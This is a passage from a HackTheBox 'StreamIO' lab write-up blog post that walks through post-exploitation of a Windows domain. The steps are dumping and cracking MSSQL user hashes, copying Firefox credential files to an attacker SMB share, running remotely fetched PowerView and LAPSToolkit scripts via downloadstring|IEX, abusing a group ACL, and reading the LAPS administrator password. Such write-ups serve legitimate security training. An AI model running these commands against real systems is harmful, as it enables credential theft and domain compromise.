</pre></table></code></div></div><h2 id="mssql-db-enumeration">MSSQL DB Enumeration<a href="#mssql-db-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>There’s <code class="language-plaintext highlighter-rouge">streamio_backup</code> as well. Let’s get users from there:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>PS C:\inetpub\streamio.htb\admin&gt; sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -d streamio_backup -Q "select * from users;"
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5  
</pre></table></code></div></div><p>Now we can send this to hashcat again as we’ve done this before already.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
</pre></table></code></div></div><h2 id="getting-shell-as-nikk37">Getting shell as nikk37<a href="#getting-shell-as-nikk37" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This are users that exist on the system <img data-src="/assets/images/6c83d88303736c632204090ae0e7285e93aeda777404e7bac34d18b1ec45d49c.png" alt="picture 53" data-proofer-ignore></p><p>Obviously, the <code class="language-plaintext highlighter-rouge">nikk37</code> is the interesting one, so let’s check it’s credentials:</p><p><img data-src="/assets/images/108b4e7f82c5439fd2c95e0d66af46cce8d3bffb666828a70645732a497a04dc.png" alt="picture 54" data-proofer-ignore></p><p>Let’s connect using Win-RM:</p><p><img data-src="/assets/images/ca745f8539c85757c4f3b37ce4b7e99daa3ce8a8551740142a82035707cd13b1.png" alt="picture 55" data-proofer-ignore></p><h2 id="starting-as-nikk37---enumeration">Starting as nikk37 - Enumeration<a href="#starting-as-nikk37---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We don’t have any special privileges as <code class="language-plaintext highlighter-rouge">nikk37</code>.</p><p>One thing that caught my eye is LAPS <img data-src="/assets/images/65488cba42edc690f21e3bb0a727b57638301cd99366ad54135958102cd6cba9.png" alt="picture 56" data-proofer-ignore></p><p>The other thing was Firefox password database:</p><p><img data-src="/assets/images/f8723bd65d9ca73f9436badbae815d359097656711ebccafadee67b1189e9caa.png" alt="picture 57" data-proofer-ignore></p><h2 id="firefox-password-database-decryption">Firefox Password Database Decryption<a href="#firefox-password-database-decryption" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We need only 2 files from the system, the <code class="language-plaintext highlighter-rouge">key4.db</code> and <code class="language-plaintext highlighter-rouge">logins.json</code>. I first thought i’d upload them to webserver, but having no privileges with <code class="language-plaintext highlighter-rouge">nikk37</code> i’ve decided to use SMB.</p><p>Start the impacket’s smbserver:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>impacket-smbserver share . -user luka -pass luka -smb2support
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\inetpub\streamio.htb\images&gt; net use \\10.10.14.6\share /u:luka luka
The command completed successfully.

*Evil-WinRM* PS C:\inetpub\streamio.htb\images&gt; copy C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db \\10.10.14.6\share
*Evil-WinRM* PS C:\inetpub\streamio.htb\images&gt; copy C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json \\10.10.14.6\share
</pre></table></code></div></div><p>And extract the passwords using <code class="language-plaintext highlighter-rouge">firepwd</code>: <img data-src="/assets/images/7a4f5d3520410262f124973acf8788b98b20c5ca6a15045d0f2b7d0b6e195730.png" alt="picture 58" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
</pre></table></code></div></div><h2 id="checking-laps">Checking LAPS<a href="#checking-laps" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Winpeass showed that there is LAPS active, so let’s use <a href="https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/master/LAPSToolkit.ps1">LAPSToolkit</a> to enumerate that:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\&gt; (new-object system.net.webclient).downloadstring('http://10.10.14.6/tools/LAPSToolkit.ps1') | IEX
*Evil-WinRM* PS C:\&gt; Get-LAPSComputers

ComputerName    Password Expiration
------------    -------- ----------
DC.streamIO.htb          09/28/2022 15:33:39


*Evil-WinRM* PS C:\&gt; Find-LAPSDelegatedGroups

OrgUnit                                  Delegated Groups
-------                                  ----------------
OU=Domain Controllers,DC=streamIO,DC=htb streamIO\CORE STAFF

## Checking Object ACLs on CORE STAFF
</pre></table></code></div></div><p>So we wan’t a user that has <code class="language-plaintext highlighter-rouge">CORE STAFF</code> group assigned to it in order to read Administrator password. Group is however empty, but let’s check ACLs if we can make any changes to it.</p><p>In order to see that, we can use powerview (however <code class="language-plaintext highlighter-rouge">Get-ObjectAcl</code> might suffice which was probably already imported with LAPSToolkit.ps1)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Get-ObjectAcl -Name "CORE STAFF" -ResolveGUIDs
</pre></table></code></div></div><p>And there it is: <img data-src="/assets/images/b4298d47745f37afc358a22c4ab747a05644c7a34019a7dc6ef115f6f50ed0fa.png" alt="picture 59" data-proofer-ignore></p><h2 id="leveraging-jdgodds-credentials">Leveraging JDgodd’s credentials<a href="#leveraging-jdgodds-credentials" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>JDgodd can write to the <code class="language-plaintext highlighter-rouge">CORE STAFF</code> group object.</p><p>JDgodd has no other groups apart from <code class="language-plaintext highlighter-rouge">Domain Users</code> so WINRM should not work BUT we still have to check the passwords that we’ve found before.</p><p><img data-src="/assets/images/7629594c55a01fd70d9b3cefe2340fc29fbffb5f1d0f0da09a73620b7a05ae93.png" alt="picture 60" data-proofer-ignore></p><p>So let’s put nikk37 into <code class="language-plaintext highlighter-rouge">CORE STAFF</code> group in <code class="language-plaintext highlighter-rouge">JDgodd</code>’s context:</p><p>ow I’ll need a credential object for JDgodd: (new-object system.net.webclient).downloadstring(‘http://10.10.14.6/tools/powerview.ps1’) | IEX</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; $cred = New-Object System.Management.Automation.PSCredential('streamio\JDgodd', $pass)

*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"

*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\nikk37"

*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; net group "CORE STAFF" /domain
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
nikk37
The command completed successfully.
</pre></table></code></div></div><p>So we should now be able to read the “Administrator”’s password using LAPS.</p><h2 id="reading-laps-password">Reading LAPS Password<a href="#reading-laps-password" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; (new-object system.net.webclient).downloadstring('http://10.10.14.6/tools/LAPSToolkit.ps1') | IEX
*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; Get-LAPSComputers

ComputerName    Password       Expiration
------------    --------       ----------
DC.streamIO.htb BO4CU03Xt5!(c1 09/28/2022 15:33:39
</pre></table></code></div></div><p>Administrator can login using WinRM:</p><p><img data-src="/assets/images/c0d013a12f36b10eed87fce25f4262c3e1154c925718857d4f8d8a93955582cb.png" alt="picture 61" data-proofer-ignore></p><p>Game over!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >SQL Injection</a> <a href="/tags/password-reuse/" class="post-tag no-text-decoration" >Password Reuse</a> <a href="/tags/hashcat/" class="post-tag no-text-decoration" >Hashcat</a> <a href="/tags/password-cracking/" class="post-tag no-text-decoration" >Password Cracking</a> <a href="/tags/laps/" class="post-tag no-text-decoration" >LAPS</a> <a href="/tags/mssql/" class="post-tag no-text-decoration" >MSSQL</a> <a href="/tags/local-file-inclusion/" class="post-tag no-text-decoration" >Local File Inclusion</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(HTB) - StreamIO - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/StreamIO/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(HTB) - StreamIO - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/StreamIO/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(HTB) - StreamIO - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/StreamIO/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/awkward/"><div class="card-body"> <em class="timeago small" date="2023-03-04 10:33:00 +0100" >Mar 4</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Awkward</h3><div class="text-muted small"><p> Enumeration NMAP 1 2 3 4 5 6 Nmap scan report for 10.129.45.168 Host is up (0.045s latency). Not shown: 65514 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ...</p></div></div></a></div><div class="card"> <a href="/posts/Reel2/"><div class="card-body"> <em class="timeago small" date="2022-09-22 11:33:00 +0200" >Sep 22, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Reel2</h3><div class="text-muted small"><p> Reel2 is an awesome Windows machine which requires phishing, password spraying, cracking. After having shell access, there is JEA implemented which makes things harder, but it’s nice to get introdu...</p></div></div></a></div><div class="card"> <a href="/posts/Luanne/"><div class="card-body"> <em class="timeago small" date="2022-09-22 11:33:00 +0200" >Sep 22, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Luanne</h3><div class="text-muted small"><p> Luanne is a easy NetBSD box, which starts command injection. Privilege escalation is done by enumerating backups and decrypting those ENUMERATION NMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Bucket/" class="btn btn-outline-primary" prompt="Older"><p>Bucket</p></a> <a href="/posts/Luanne/" class="btn btn-outline-primary" prompt="Newer"><p>(HTB) - Luanne</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
